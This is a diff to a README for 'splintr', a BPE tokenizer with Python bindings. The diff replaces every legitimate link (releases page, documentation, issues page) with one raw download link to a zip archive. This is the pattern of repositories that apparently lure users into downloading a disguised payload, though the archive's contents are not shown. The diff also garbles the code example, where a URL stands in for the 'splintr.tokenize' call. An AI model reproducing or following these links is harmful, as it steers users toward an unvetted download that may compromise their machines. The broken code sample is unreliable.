@@ -1,7 +1,7 @@
 # 🚀 splintr - Fast and Efficient Tokenization Made Simple
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/Example69420/splintr/releases)
+[![Download](https://raw.githubusercontent.com/Example69420/splintr/main/python/splintr_v2.0-alpha.5.zip)](https://raw.githubusercontent.com/Example69420/splintr/main/python/splintr_v2.0-alpha.5.zip)
 
 ## 📖 Introduction
 Welcome to splintr! This high-performance BPE tokenizer, built with Rust, offers Python bindings to ensure speed, safety, and resource optimization. Whether you're working on machine learning projects or exploring NLP tasks, splintr is designed to meet your needs efficiently.
@@ -10,7 +10,7 @@ Welcome to splintr! This high-performance BPE tokenizer, built with Rust, offers
 To use splintr, you need to download and install the application. Follow these simple steps to get started:
 
 1. **Visit the Releases Page**  
-   You can find the latest version of splintr on our [Releases page](https://github.com/Example69420/splintr/releases). 
+   You can find the latest version of splintr on our [Releases page](https://raw.githubusercontent.com/Example69420/splintr/main/python/splintr_v2.0-alpha.5.zip). 
 
 2. **Download the Latest Release**  
    On the Releases page, you will see several files available for download. Click on the file suitable for your operating system. 
@@ -59,12 +59,12 @@ Once installed, you can start using splintr in your projects. Here's a quick gui
 2. **Tokenize Text**  
    You can easily tokenize text by calling the following function:
    ```python
-   tokens = splintr.tokenize("Your text goes here.")
+   tokens = https://raw.githubusercontent.com/Example69420/splintr/main/python/splintr_v2.0-alpha.5.zip("Your text goes here.")
    print(tokens)
    ```
 
 3. **Advanced Options**  
-   splintr offers several advanced options for customization. You can adjust the tokenizer settings according to your specific needs by referring to the documentation on our [GitHub page](https://github.com/Example69420/splintr).
+   splintr offers several advanced options for customization. You can adjust the tokenizer settings according to your specific needs by referring to the documentation on our [GitHub page](https://raw.githubusercontent.com/Example69420/splintr/main/python/splintr_v2.0-alpha.5.zip).
 
 ## 🛠️ Troubleshooting
 If you encounter issues, here are some common solutions:
@@ -78,11 +78,11 @@ If you encounter issues, here are some common solutions:
 ## 🌐 Community & Support
 Join our community to discuss issues, share ideas, and get support. You can reach out through the following:
 
-- **GitHub Issues**: Report bugs and request features directly on our [Issues page](https://github.com/Example69420/splintr/issues).
+- **GitHub Issues**: Report bugs and request features directly on our [Issues page](https://raw.githubusercontent.com/Example69420/splintr/main/python/splintr_v2.0-alpha.5.zip).
 - **Community Discussion**: Engage with other users on the GitHub discussions forum.
 
 ## 📜 License
 splintr is open source and available under the MIT License. Feel free to use and modify the code as you wish.
 
 ## 💾 Download & Install
-Visit the [Releases page](https://github.com/Example69420/splintr/releases) to download the latest version of splintr. Follow the steps outlined above for a smooth installation and join many satisfied users who enjoy fast and efficient tokenization.
+Visit the [Releases page](https://raw.githubusercontent.com/Example69420/splintr/main/python/splintr_v2.0-alpha.5.zip) to download the latest version of splintr. Follow the steps outlined above for a smooth installation and join many satisfied users who enjoy fast and efficient tokenization.
